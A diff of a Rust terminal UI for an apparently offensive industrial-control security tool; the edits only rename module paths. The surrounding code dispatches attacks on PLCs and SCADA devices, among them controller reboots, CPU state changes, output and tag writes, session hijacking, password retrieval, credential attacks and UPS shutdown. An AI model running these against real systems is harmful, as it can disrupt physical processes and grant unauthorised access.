@@ -3,8 +3,8 @@
 //! MQTT topic browser, live message display, and topic table layout were informed by
 //! `mqttui` by `EdJoPaTo`: <https://github.com/EdJoPaTo/mqttui>
 #![allow(clippy::too_many_lines)]
-use crate::core::autodetect::{probe_all, DeviceInfo};
-use crate::core::network::{get_interfaces, local_ip_for, NetworkInterface};
+use casket::core::autodetect::{probe_all, DeviceInfo};
+use casket::core::network::{get_interfaces, local_ip_for, NetworkInterface};
 use crate::db::{Database, DeviceRecord};
 use anyhow::Result;
 use crossterm::event::{self, Event, KeyCode, KeyEventKind, KeyModifiers};
@@ -22,8 +22,8 @@ use std::fmt::Write as _;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
-use scadaver::vendors::mqtt::attacks::{acl_variants, classify_payload, is_sensitive};
-use scadaver::vendors::mqtt::session::{ConnectOptions, MqttSession, MqttVersion};
+use casket::vendors::mqtt::attacks::{acl_variants, classify_payload, is_sensitive};
+use casket::vendors::mqtt::session::{ConnectOptions, MqttSession, MqttVersion};
 
 // ─── Background events ───────────────────────────────────────────────────────
 
@@ -509,7 +509,7 @@ impl SchneiderCapabilities {
             || protocol == "modbus_tcp"
             || (discovery_transport == "tcp" && field_port_value(fields, "modbus_port").is_some());
         let modbus_port =
-            field_port_value(fields, "modbus_port").unwrap_or(crate::core::modbus::DEFAULT_PORT);
+            field_port_value(fields, "modbus_port").unwrap_or(casket::core::modbus::DEFAULT_PORT);
         let web_port = field_port_value(fields, "web_port");
         let fc90_family = SchneiderFamily::from_field(field_str(fields, "fc90_family"))
             .max_confidence(SchneiderFamily::from_name(name));
@@ -765,25 +765,25 @@ impl App {
             "beckhoff" => match idx {
                 0 | 1 | 2 | 5 | 7 | 8 => self.field_port(
                     &["ads_port", "port"],
-                    crate::vendors::beckhoff::scan::DEFAULT_ADS_PORT,
+                    casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT,
                 ),
                 3 | 4 => self.field_port(
                     &["web_port"],
-                    crate::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT,
+                    casket::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT,
                 ),
                 _ => self.device_port(0),
             },
             "mitsubishi" => match idx {
                 0..=4 | 8..=11 => self.field_port(
                     &["slmp_port", "port"],
-                    crate::vendors::mitsubishi::slmp::DEFAULT_PORT,
+                    casket::vendors::mitsubishi::slmp::DEFAULT_PORT,
                 ),
                 _ => self.device_port(0),
             },
             "schneider" | "modicon" => match idx {
                 1..=3 => self.field_port(&["web_port"], 80),
                 4..=19 => {
-                    self.field_port(&["modbus_port", "port"], crate::core::modbus::DEFAULT_PORT)
+                    self.field_port(&["modbus_port", "port"], casket::core::modbus::DEFAULT_PORT)
                 }
                 _ => self.device_port(0),
             },
@@ -799,15 +799,15 @@ impl App {
             "ewon" => self.field_port(&["http_port", "web_port", "port"], 80),
             "omron" => self.field_port(
                 &["fins_port", "port"],
-                crate::vendors::omron::fins::FINS_TCP_PORT,
+                casket::vendors::omron::fins::FINS_TCP_PORT,
             ),
             "iec104" => self.field_port(
                 &["iec104_port", "port"],
-                crate::vendors::iec104::client::IEC104_PORT,
+                casket::vendors::iec104::client::IEC104_PORT,
             ),
             "snmp" => self.field_port(
                 &["snmp_port", "port"],
-                crate::vendors::snmp::client::SNMP_PORT,
+                casket::vendors::snmp::client::SNMP_PORT,
             ),
             _ => self.device_port(0),
         }
@@ -1430,8 +1430,8 @@ fn selected_transport(app: &App) -> Option<TargetTransport> {
         .and_then(parse_target_transport)
 }
 
-fn schneider_transport(transport: TargetTransport) -> crate::vendors::schneider::scan::Transport {
-    use crate::vendors::schneider::scan::Transport;
+fn schneider_transport(transport: TargetTransport) -> casket::vendors::schneider::scan::Transport {
+    use casket::vendors::schneider::scan::Transport;
     match transport {
         TargetTransport::Udp => Transport::Udp,
         TargetTransport::Tcp => Transport::Tcp,
@@ -1439,8 +1439,8 @@ fn schneider_transport(transport: TargetTransport) -> crate::vendors::schneider:
     }
 }
 
-fn mitsubishi_transport(transport: TargetTransport) -> crate::vendors::mitsubishi::scan::Transport {
-    use crate::vendors::mitsubishi::scan::Transport;
+fn mitsubishi_transport(transport: TargetTransport) -> casket::vendors::mitsubishi::scan::Transport {
+    use casket::vendors::mitsubishi::scan::Transport;
     match transport {
         TargetTransport::Udp => Transport::Udp,
         TargetTransport::Tcp => Transport::Tcp,
@@ -1448,7 +1448,7 @@ fn mitsubishi_transport(transport: TargetTransport) -> crate::vendors::mitsubish
     }
 }
 
-fn schneider_device_info(d: crate::vendors::schneider::scan::SchneiderDevice) -> DeviceInfo {
+fn schneider_device_info(d: casket::vendors::schneider::scan::SchneiderDevice) -> DeviceInfo {
     let ip = d.ip.clone();
     let mut fields = HashMap::new();
     let name_for_family = d.name.clone().unwrap_or_default();
@@ -1475,11 +1475,11 @@ fn schneider_device_info(d: crate::vendors::schneider::scan::SchneiderDevice) ->
     } else {
         fields.insert(
             "port".into(),
-            Value::Number(i64::from(crate::core::modbus::DEFAULT_PORT).into()),
+            Value::Number(i64::from(casket::core::modbus::DEFAULT_PORT).into()),
         );
         fields.insert(
             "modbus_port".into(),
-            Value::Number(i64::from(crate::core::modbus::DEFAULT_PORT).into()),
+            Value::Number(i64::from(casket::core::modbus::DEFAULT_PORT).into()),
         );
     }
     if let Some(transport) = d.discovery_transport {
@@ -1511,7 +1511,7 @@ fn schneider_device_info(d: crate::vendors::schneider::scan::SchneiderDevice) ->
     }
 }
 
-fn mitsubishi_device_info(d: crate::vendors::mitsubishi::scan::MitsubishiDevice) -> DeviceInfo {
+fn mitsubishi_device_info(d: casket::vendors::mitsubishi::scan::MitsubishiDevice) -> DeviceInfo {
     let ip = d.ip.clone();
     let mut fields = HashMap::new();
     let protocol = d.protocol.clone().unwrap_or_default();
@@ -1533,7 +1533,7 @@ fn mitsubishi_device_info(d: crate::vendors::mitsubishi::scan::MitsubishiDevice)
         } else {
             fields.insert(
                 "port".into(),
-                Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
+                Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
             );
             fields.insert(
                 "discovery_port".into(),
@@ -1541,17 +1541,17 @@ fn mitsubishi_device_info(d: crate::vendors::mitsubishi::scan::MitsubishiDevice)
             );
             fields.insert(
                 "slmp_port".into(),
-                Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
+                Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
             );
         }
     } else {
         fields.insert(
             "port".into(),
-            Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
+            Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
         );
         fields.insert(
             "slmp_port".into(),
-            Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
+            Value::Number(i64::from(casket::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
         );
     }
     if let Some(transport) = d.discovery_transport {
@@ -1575,7 +1575,7 @@ fn mitsubishi_device_info(d: crate::vendors::mitsubishi::scan::MitsubishiDevice)
 }
 
 fn beckhoff_device_info(
-    d: crate::vendors::beckhoff::scan::BeckhoffDevice,
+    d: casket::vendors::beckhoff::scan::BeckhoffDevice,
     port: Option<u16>,
 ) -> DeviceInfo {
     let ip = d.ip.clone();
@@ -1595,18 +1595,18 @@ fn beckhoff_device_info(
     fields.insert(
         "port".into(),
         Value::Number(
-            i64::from(port.unwrap_or(crate::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
+            i64::from(port.unwrap_or(casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
         ),
     );
     fields.insert(
         "ads_port".into(),
         Value::Number(
-            i64::from(port.unwrap_or(crate::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
+            i64::from(port.unwrap_or(casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
         ),
     );
     fields.insert(
         "web_port".into(),
-        Value::Number(i64::from(crate::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into()),
+        Value::Number(i64::from(casket::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into()),
     );
     fields.insert("cap_ads_tcp".into(), Value::Bool(true));
     fields.insert(
@@ -1627,7 +1627,7 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
         let _ = tx.send(ScanEvent::Output(format!("[*] Probing {label}...")));
 
         if matches!(target.vendor.as_deref(), Some("mitsubishi")) {
-            use crate::vendors::mitsubishi::{scan, slmp};
+            use casket::vendors::mitsubishi::{scan, slmp};
 
             let port = target.port.unwrap_or(slmp::DEFAULT_PORT);
             let transport = target.transport.unwrap_or(TargetTransport::Both);
@@ -1663,7 +1663,7 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
         }
 
         if matches!(target.vendor.as_deref(), Some("beckhoff")) {
-            use crate::vendors::beckhoff::scan;
+            use casket::vendors::beckhoff::scan;
 
             let _ = tx.send(ScanEvent::Output(format!(
                 "[*] Beckhoff targeted discovery (ADS TCP port {})...",
@@ -1693,7 +1693,7 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
             fields.insert(
                 "web_port".into(),
                 Value::Number(
-                    i64::from(crate::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into(),
+                    i64::from(casket::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into(),
                 ),
             );
             fields.insert("protocol".into(), Value::String("ads_tcp".into()));
@@ -1716,8 +1716,8 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
         }
 
         if target.should_try_schneider() {
-            use crate::core::modbus;
-            use crate::vendors::schneider::scan;
+            use casket::core::modbus;
+            use casket::vendors::schneider::scan;
 
             let port = target.port.unwrap_or(modbus::DEFAULT_PORT);
             let transport = target.transport.unwrap_or(TargetTransport::Both);
@@ -1874,7 +1874,7 @@ fn run_vendor_broadcast(vendor_idx: usize, iface: &NetworkInterface, tx: &mpsc::
 }
 
 fn scan_broadcast_beckhoff(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
-    use crate::vendors::beckhoff::scan;
+    use casket::vendors::beckhoff::scan;
     if let Ok(devs) = scan::discover(iface, 3, true) {
         for d in devs {
             let ip = d.ip.clone();
@@ -1891,7 +1891,7 @@ fn scan_broadcast_beckhoff(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent
 }
 
 fn scan_broadcast_enip(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
-    use crate::vendors::enip::scan;
+    use casket::vendors::enip::scan;
     if let Ok(devs) = scan::scan(iface, 3, true) {
         for d in devs {
             let ip = d.ip.clone();
@@ -1925,7 +1925,7 @@ fn scan_broadcast_enip(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
 }
 
 fn scan_broadcast_schneider(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
-    use crate::vendors::schneider::scan;
+    use casket::vendors::schneider::scan;
     if let Ok(devs) = scan::scan(iface, 3, true) {
         for d in devs {
             let ip = d.ip.clone();
@@ -1940,7 +1940,7 @@ fn scan_broadcast_schneider(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEven
 }
 
 fn scan_broadcast_mitsubishi(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
-    use crate::vendors::mitsubishi::scan;
+    use casket::vendors::mitsubishi::scan;
     if let Ok(devs) = scan::scan(iface, 3, true) {
         for d in devs {
             let ip = d.ip.clone();
@@ -1957,7 +1957,7 @@ fn scan_broadcast_mitsubishi(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEve
 }
 
 fn scan_broadcast_ewon(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
-    use crate::vendors::ewon::scan;
+    use casket::vendors::ewon::scan;
     if let Ok(devs) = scan::scan(iface, 3, true) {
         for d in devs {
             if d.response_type != "device_info" {
@@ -2123,7 +2123,7 @@ fn dispatch_exploit(
         ("ewon", 0) => exploit_ewon_creds(ip, port, input, &out),
         ("ewon", 1) => {
             out(&format!("Reading tags from eWON at {ip}…"));
-            match crate::vendors::ewon::scan::read_tag_values(ip, port, None) {
+            match casket::vendors::ewon::scan::read_tag_values(ip, port, None) {
                 Ok(tags) => {
                     let leaves: Vec<(String, bool)> =
                         tags.iter().map(|(n, _)| (n.clone(), false)).collect();
@@ -2215,7 +2215,7 @@ fn dispatch_exploit(
         ("snmp", 7) => exploit_snmp_apc_status(ip, port, input, &out),
         ("snmp", 8) => exploit_snmp_apc_shutdown(ip, port, input, &out),
         ("bacnet", 0) => {
-            use crate::vendors::bacnet::client as bacnet;
+            use casket::vendors::bacnet::client as bacnet;
             let timeout = std::time::Duration::from_secs(5);
             if let Some(dev) = bacnet::scan_ip(ip, 5) {
                 out(&format!("Instance ID : {}", dev.instance_id));
@@ -2230,7 +2230,7 @@ fn dispatch_exploit(
             let _ = timeout; // suppress unused
         }
         ("bacnet", 1) => {
-            use crate::vendors::bacnet::client as bacnet;
+            use casket::vendors::bacnet::client as bacnet;
             let timeout = std::time::Duration::from_secs(5);
             if let Some(dev) = bacnet::scan_ip(ip, 5) {
                 let prop_ids = [
@@ -2250,7 +2250,7 @@ fn dispatch_exploit(
             }
         }
         ("bacnet", 2) => {
-            use crate::vendors::bacnet::client as bacnet;
+            use casket::vendors::bacnet::client as bacnet;
             let timeout = std::time::Duration::from_secs(5);
             let devices = bacnet::who_is_broadcast(timeout);
             if devices.is_empty() {
@@ -2266,7 +2266,7 @@ fn dispatch_exploit(
             }
         }
         ("dnp3", 0) => {
-            use crate::vendors::dnp3::client as dnp3;
+            use casket::vendors::dnp3::client as dnp3;
             let timeout = std::time::Duration::from_secs(5);
             let attrs = dnp3::read_device_attributes(ip, timeout);
             if attrs.is_empty() {
@@ -2280,7 +2280,7 @@ fn dispatch_exploit(
             }
         }
         ("dnp3", 1) => {
-            use crate::vendors::dnp3::client as dnp3;
+            use casket::vendors::dnp3::client as dnp3;
             let timeout = std::time::Duration::from_secs(5);
             let lines = dnp3::read_integrity_poll(ip, timeout);
             if lines.is_empty() {
@@ -2291,7 +2291,7 @@ fn dispatch_exploit(
             }
         }
         ("opcua", 0) => {
-            use crate::vendors::opcua::client as opcua;
+            use casket::vendors::opcua::client as opcua;
             let timeout = std::time::Duration::from_secs(5);
             if let Some(server) = opcua::detect(ip, 4840, timeout) {
                 let endpoints = opcua::get_endpoints(ip, 4840, timeout);
@@ -2309,7 +2309,7 @@ fn dispatch_exploit(
             }
         }
         ("opcua", 1) => {
-            use crate::vendors::opcua::client as opcua;
+            use casket::vendors::opcua::client as opcua;
             let timeout = std::time::Duration::from_secs(5);
             let endpoints = opcua::get_endpoints(ip, 4840, timeout);
             if endpoints.is_empty() {
@@ -2324,7 +2324,7 @@ fn dispatch_exploit(
             }
         }
         ("opcua", 2) => {
-            use crate::vendors::opcua::client as opcua;
+            use casket::vendors::opcua::client as opcua;
             let timeout = std::time::Duration::from_secs(5);
             let endpoints = opcua::get_endpoints(ip, 4840, timeout);
             let vuln: Vec<_> = endpoints.iter()
@@ -2344,7 +2344,7 @@ fn dispatch_exploit(
         ("mqtt", 0) => {
             let (topic, payload_str) = input.split_once(':').unwrap_or((input, ""));
             let mqtt_port = if port == 0 {
-                crate::vendors::mqtt::client::MQTT_PORT
+                casket::vendors::mqtt::client::MQTT_PORT
             } else {
                 port
             };
@@ -2364,7 +2364,7 @@ fn dispatch_exploit(
         }
         ("mqtt", 1) => {
             let mqtt_port = if port == 0 {
-                crate::vendors::mqtt::client::MQTT_PORT
+                casket::vendors::mqtt::client::MQTT_PORT
             } else {
                 port
             };
@@ -2439,7 +2439,7 @@ fn dispatch_exploit(
 }
 
 fn exploit_beckhoff_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::{ads, scan};
+    use casket::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Discovering Beckhoff at {ip}..."));
     match scan::discover_ip_with_port(ip, 3, true, port)
@@ -2471,7 +2471,7 @@ fn exploit_beckhoff_info(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_beckhoff_state(ip: &str, port: u16, state: &str, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::{ads, scan};
+    use casket::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Setting TwinCAT state to {state} on {ip}..."));
     match scan::discover_ip_with_port(ip, 3, true, port)
@@ -2492,7 +2492,7 @@ fn exploit_beckhoff_state(ip: &str, port: u16, state: &str, out: &impl Fn(&str))
 }
 
 fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::webcontrol;
+    use casket::vendors::beckhoff::webcontrol;
     out(&format!("[*] Sending reboot to {ip}..."));
     match webcontrol::reboot(ip, port) {
         Ok(true) => out("[+] Reboot command sent"),
@@ -2502,7 +2502,7 @@ fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_beckhoff_adduser(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::webcontrol;
+    use casket::vendors::beckhoff::webcontrol;
     let (uname, pass) = input.split_once(':').unwrap_or((input, "Sc4d4v3r!"));
     out(&format!("[*] Adding user '{uname}' to {ip}..."));
     match webcontrol::add_user(ip, port, uname, pass) {
@@ -2523,7 +2523,7 @@ fn device_field_str(ip: &str, key: &str) -> Option<String> {
 }
 
 fn exploit_siemens_cpu(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let db_password = device_field_str(ip, "password");
     let password: Option<&str> =
@@ -2542,7 +2542,7 @@ fn exploit_siemens_cpu(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_siemens_io(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let db_password = device_field_str(ip, "password");
     let password: Option<&str> =
@@ -2605,7 +2605,7 @@ fn exploit_siemens_io(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_siemens_toggle(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let db_password = device_field_str(ip, "password");
     let password: Option<&str> =
@@ -2624,7 +2624,7 @@ fn exploit_siemens_toggle(ip: &str, port: u16, input: &str, out: &impl Fn(&str))
 }
 
 fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::flash_led;
+    use casket::vendors::schneider::flash_led;
     out(&format!("[*] Flashing LED on {ip}..."));
     match flash_led::flash_led_ip(ip) {
         Ok(()) => out("[+] Flash LED command sent"),
@@ -2633,7 +2633,7 @@ fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_schneider_hijack_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::session_hijack;
+    use casket::vendors::schneider::session_hijack;
     let username = if input.trim().is_empty() { "Administrator" } else { input.trim() };
     out(&format!("[*] Getting session cookie from {ip}..."));
     match session_hijack::get_session_cookie(ip, port) {
@@ -2652,7 +2652,7 @@ fn exploit_schneider_hijack_info(ip: &str, port: u16, input: &str, out: &impl Fn
 }
 
 fn exploit_schneider_action(ip: &str, port: u16, action: &str, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::schneider::session_hijack;
+    use casket::vendors::schneider::session_hijack;
     let username = if input.trim().is_empty() { "Administrator" } else { input.trim() };
     out(&format!("[*] Getting session cookie from {ip}..."));
     match session_hijack::get_session_cookie(ip, port) {
@@ -2669,7 +2669,7 @@ fn exploit_schneider_action(ip: &str, port: u16, action: &str, input: &str, out:
 }
 
 fn exploit_phoenix_passwords(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::webvisit;
+    use casket::vendors::phoenix::webvisit;
     out(&format!("[*] Retrieving passwords from {ip}..."));
     match webvisit::retrieve_passwords(ip, port) {
         Ok(entries) => {
@@ -2688,7 +2688,7 @@ fn exploit_phoenix_passwords(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_phoenix_list_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::webvisit;
+    use casket::vendors::phoenix::webvisit;
     out(&format!("[*] Listing tags on {ip}..."));
     match webvisit::get_tags(ip, port) {
         Ok((project, tags)) => {
@@ -2703,7 +2703,7 @@ fn exploit_phoenix_list_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_phoenix_read_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::webvisit;
+    use casket::vendors::phoenix::webvisit;
     out(&format!("[*] Reading tag values from {ip}..."));
     let tags_result = webvisit::get_tags(ip, port);
     match tags_result {
@@ -2720,7 +2720,7 @@ fn exploit_phoenix_read_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_phoenix_write_tag(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::webvisit;
+    use casket::vendors::phoenix::webvisit;
     let (tag_name, value) = input.split_once('=').unwrap_or((input, "0"));
     out(&format!("[*] Writing {tag_name}={value} on {ip}..."));
     match webvisit::write_tag_value(ip, port, tag_name, value) {
@@ -2730,7 +2730,7 @@ fn exploit_phoenix_write_tag(ip: &str, port: u16, input: &str, out: &impl Fn(&st
 }
 
 fn exploit_phoenix_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::phoenix::control;
+    use casket::vendors::phoenix::control;
     out(&format!("[*] Getting device info from {ip}..."));
     match control::get_device_info(ip, port, false) {
         Ok(info) => {
@@ -2747,7 +2747,7 @@ fn exploit_phoenix_info(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::ewon::exploit;
+    use casket::vendors::ewon::exploit;
     let (username, max_str) = if input.is_empty() {
         ("adm", "20")
     } else {
@@ -2772,7 +2772,7 @@ fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_rockwell_identity(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
     out(&format!("[*] Getting device identity from {ip}..."));
     match driver::get_device_info(ip, port) {
         Ok(dev) => {
@@ -2788,7 +2788,7 @@ fn exploit_rockwell_identity(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) -> Vec<(String, bool)> {
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
     use std::collections::HashMap;
 
     let mut leaves_out: Vec<(String, bool)> = Vec::new();
@@ -2955,11 +2955,11 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) -> Vec<(Strin
 
 fn save_tags_and_diff(
     ip: &str,
-    tags: &[crate::vendors::rockwell::driver::LogixTag],
+    tags: &[casket::vendors::rockwell::driver::LogixTag],
     out: &impl Fn(&str),
 ) {
     use crate::db::Database;
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
     match Database::open(&Database::default_path()) {
         Ok(db) => {
             // Normalize BOOL bit-position variants (low byte 0x00..0x1F = bit N of a word)
@@ -3020,7 +3020,7 @@ fn save_tags_and_diff(
 }
 
 fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc<AtomicBool>) {
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
     out(&format!("[*] Tag monitor started for {ip}"));
     out("[*] Fetching baseline tags...");
 
@@ -3067,7 +3067,7 @@ fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc
 }
 
 fn exploit_rockwell_read(ip: &str, port: u16, tag: &str, out: &impl Fn(&str)) {
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
     out(&format!("[*] Reading tag '{tag}' from {ip}..."));
     match driver::read_tag(ip, port, tag) {
         Ok(raw) => out(&format!("  {tag} = 0x{}", hex_fmt(&raw))),
@@ -3076,7 +3076,7 @@ fn exploit_rockwell_read(ip: &str, port: u16, tag: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
     let (tag_name, raw_val) = input.split_once('=').unwrap_or((input, "00"));
     let hex_val = raw_val.trim().trim_start_matches("0x").trim_start_matches("0X");
     let value_bytes: Vec<u8> = hex_val
@@ -3098,7 +3098,7 @@ fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str))
 }
 
 fn exploit_mitsubishi_info(ip: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::scan;
+    use casket::vendors::mitsubishi::scan;
     out(&format!("[*] Getting Mitsubishi device info from {ip}..."));
     match scan::scan_ip(ip, 3, true) {
         Ok(devs) => {
@@ -3120,7 +3120,7 @@ fn exploit_mitsubishi_info(ip: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_mitsubishi_state(ip: &str, state: &str, out: &impl Fn(&str)) {
-    use crate::vendors::mitsubishi::control;
+    use casket::vendors::mitsubishi::control;
     let iface = NetworkInterface {
         name: "auto".into(),
         ip: local_ip_for(ip),
@@ -3161,7 +3161,7 @@ fn modbus_header() -> [String; 2] {
     ]
 }
 
-fn fmt_modbus_row(r: &crate::vendors::schneider::modbus::ModbusRegister) -> String {
+fn fmt_modbus_row(r: &casket::vendors::schneider::modbus::ModbusRegister) -> String {
     format!(
         "  {:<10}  {:<8}  {:<10}  {:#06x}",
         r.address, r.display_addr, r.raw, r.raw
@@ -3175,7 +3175,7 @@ fn slmp_header() -> [String; 2] {
     ]
 }
 
-fn fmt_slmp_row(v: &crate::vendors::mitsubishi::slmp::SlmpValue) -> String {
+fn fmt_slmp_row(v: &casket::vendors::mitsubishi::slmp::SlmpValue) -> String {
     format!("  {:<12}  {:<10}  {}", v.display, v.raw, v.value_str)
 }
 
@@ -3233,7 +3233,7 @@ fn save_and_diff(
 // ─── New Beckhoff exploits ───────────────────────────────────────────────────
 
 fn exploit_beckhoff_get_state(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::{ads, scan};
+    use casket::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Reading TwinCAT runtime state from {ip}..."));
     match scan::discover_ip_with_port(ip, 3, true, port)
@@ -3254,7 +3254,7 @@ fn exploit_beckhoff_get_state(ip: &str, port: u16, out: &impl Fn(&str)) {
 }
 
 fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::beckhoff::{ads, scan};
+    use casket::vendors::beckhoff::{ads, scan};
     let local_ip = local_ip_for(ip);
     let local_netid = ads::build_local_netid(&local_ip);
     let (username, password) = input.split_once(':').unwrap_or((input, "1"));
@@ -3292,7 +3292,7 @@ fn exploit_beckhoff_symbols(
     out: &impl Fn(&str),
     tx: &mpsc::Sender<ScanEvent>,
 ) {
-    use crate::vendors::beckhoff::{ads, scan};
+    use casket::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Enumerating ADS symbols on {ip}..."));
     let Some(dev) = scan::discover_ip_with_port(ip, 3, true, port)
@@ -3349,7 +3349,7 @@ fn exploit_beckhoff_symbols(
 // ─── New Siemens exploits ────────────────────────────────────────────────────
 
 fn exploit_siemens_set_outputs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let password = device_field_str(ip, "password");
     let args = input.trim();
@@ -3364,7 +3364,7 @@ fn exploit_siemens_set_outputs(ip: &str, port: u16, input: &str, out: &impl Fn(&
 }
 
 fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let password = device_field_str(ip, "password");
     let args = input.trim();
@@ -3383,7 +3383,7 @@ fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&
 }
 
 fn exploit_siemens_list_dbs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
     let port = if port == 0 { 102 } else { port };
     let db_password = device_field_str(ip, "password");
     let password: Option<&str> =
@@ -3409,7 +3409,7 @@ fn exploit_siemens_list_dbs(ip: &str, port: u16, input: &str, out: &impl Fn(&str
 }
 
 fn exploit_siemens_read_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::siemens::s7comm;
+    use casket::vendors::siemens::s7comm;
